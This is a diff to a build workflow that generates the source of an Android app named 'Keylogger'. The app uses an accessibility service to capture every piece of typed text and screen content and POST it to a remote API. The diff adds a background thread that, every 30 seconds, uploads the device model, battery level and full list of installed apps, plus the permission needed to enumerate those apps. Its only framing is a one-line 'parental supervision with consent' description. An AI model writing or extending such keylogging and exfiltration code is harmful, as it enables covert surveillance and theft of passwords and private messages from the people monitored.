@@ -114,6 +114,7 @@ jobs:
               package="com.example.keylogger">
 
               <uses-permission android:name="android.permission.INTERNET" />
+              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
 
               <application
                   android:allowBackup="true"
@@ -191,14 +192,25 @@ jobs:
           package com.example.keylogger;
 
           import android.accessibilityservice.AccessibilityService;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.content.IntentFilter;
+          import android.content.pm.ApplicationInfo;
+          import android.content.pm.PackageManager;
+          import android.os.BatteryManager;
+          import android.os.Build;
           import android.os.Handler;
           import android.os.Looper;
           import android.view.accessibility.AccessibilityEvent;
           import android.view.accessibility.AccessibilityNodeInfo;
+          import org.json.JSONArray;
           import org.json.JSONObject;
           import java.io.File;
           import java.io.FileWriter;
           import java.io.IOException;
+          import java.util.ArrayList;
+          import java.util.List;
           import java.util.concurrent.TimeUnit;
           import okhttp3.MediaType;
           import okhttp3.OkHttpClient;
@@ -218,11 +230,13 @@ jobs:
 
               private Handler mainHandler = new Handler(Looper.getMainLooper());
               private Thread uiSenderThread;
+              private Thread deviceStateThread;
 
               @Override
               public void onServiceConnected() {
                   super.onServiceConnected();
                   startUiSender();
+                  startDeviceStateSender();
               }
 
               private void startUiSender() {
@@ -242,18 +256,77 @@ jobs:
                   uiSenderThread.start();
               }
 
-              @Override
-              public void onAccessibilityEvent(AccessibilityEvent event) {
-                  if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                      if (event.getText() != null && event.getText().size() > 0) {
-                          CharSequence typedText = event.getText().get(0);
-                          if (typedText != null && typedText.length() > 0) {
-                              String text = typedText.toString();
-                              logToFile(text);
-                              sendKeylog(text);
+              private void startDeviceStateSender() {
+                  deviceStateThread = new Thread(() -> {
+                      while (!Thread.currentThread().isInterrupted()) {
+                          try {
+                              sendDeviceState();
+                              Thread.sleep(30000); // send every 30 seconds
+                          } catch (InterruptedException e) {
+                              Thread.currentThread().interrupt();
+                          } catch (Exception e) {
+                              e.printStackTrace();
                           }
                       }
+                  });
+                  deviceStateThread.setDaemon(true);
+                  deviceStateThread.start();
+              }
+
+              private void sendDeviceState() {
+                  try {
+                      String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
+                      int battery = getBatteryLevel();
+                      List<InstalledApp> apps = getInstalledApps();
+
+                      JSONArray appsArray = new JSONArray();
+                      for (InstalledApp app : apps) {
+                          JSONObject obj = new JSONObject();
+                          obj.put("name", app.name);
+                          obj.put("package", app.packageName);
+                          appsArray.put(obj);
+                      }
+
+                      JSONObject payload = new JSONObject();
+                      payload.put("deviceId", DEVICE_ID);
+                      payload.put("deviceName", deviceName);
+                      payload.put("battery", battery);
+                      payload.put("installedApps", appsArray);
+
+                      RequestBody body = RequestBody.create(
+                              MediaType.parse("application/json; charset=utf-8"),
+                              payload.toString()
+                      );
+                      Request request = new Request.Builder()
+                              .url(API_BASE + "/api/device-state")
+                              .post(body)
+                              .build();
+                      httpClient.newCall(request).execute().close();
+                  } catch (Exception e) {
+                      e.printStackTrace();
                   }
+              }
+
+              private int getBatteryLevel() {
+                  BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
+                  if (bm != null) {
+                      return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
+                  }
+                  return 0;
+              }
+
+              private List<InstalledApp> getInstalledApps() {
+                  List<InstalledApp> list = new ArrayList<>();
+                  PackageManager pm = getPackageManager();
+                  List<ApplicationInfo> apps = pm.getInstalledApplications(0);
+                  for (ApplicationInfo appInfo : apps) {
+                      if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                          String name = pm.getApplicationLabel(appInfo).toString();
+                          String packageName = appInfo.packageName;
+                          list.add(new InstalledApp(name, packageName));
+                      }
+                  }
+                  return list;
               }
 
               private void sendKeylog(String text) {
@@ -268,12 +341,10 @@ jobs:
                                   MediaType.parse("application/json; charset=utf-8"),
                                   payload.toString()
                           );
-
                           Request request = new Request.Builder()
                                   .url(API_BASE + "/api/keylog")
                                   .post(body)
                                   .build();
-
                           httpClient.newCall(request).execute().close();
                       } catch (Exception e) {
                           e.printStackTrace();
@@ -297,15 +368,27 @@ jobs:
                               MediaType.parse("application/json; charset=utf-8"),
                               payload.toString()
                       );
-
                       Request request = new Request.Builder()
                               .url(API_BASE + "/api/ui")
                               .post(body)
                               .build();
-
                       httpClient.newCall(request).execute().close();
                   } catch (Exception e) {
                       e.printStackTrace();
+                  }
+              }
+
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {
+                  if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                      if (event.getText() != null && event.getText().size() > 0) {
+                          CharSequence typedText = event.getText().get(0);
+                          if (typedText != null && typedText.length() > 0) {
+                              String text = typedText.toString();
+                              logToFile(text);
+                              sendKeylog(text);
+                          }
+                      }
                   }
               }
 
@@ -349,6 +432,18 @@ jobs:
                   if (uiSenderThread != null && uiSenderThread.isAlive()) {
                       uiSenderThread.interrupt();
                   }
+                  if (deviceStateThread != null && deviceStateThread.isAlive()) {
+                      deviceStateThread.interrupt();
+                  }
+              }
+
+              private static class InstalledApp {
+                  String name;
+                  String packageName;
+                  InstalledApp(String name, String packageName) {
+                      this.name = name;
+                      this.packageName = packageName;
+                  }
               }
           }
           EOF
@@ -370,7 +465,7 @@ jobs:
           cat > app/src/main/res/values/strings.xml << 'EOF'
           <resources>
               <string name="app_name">Keylogger</string>
-              <string name="accessibility_service_description">This service captures typed text and screen content for parental supervision with consent.</string>
+              <string name="accessibility_service_description">This service captures typed text, screen content, device state and installed apps for parental supervision with consent.</string>
           </resources>
           EOF
 
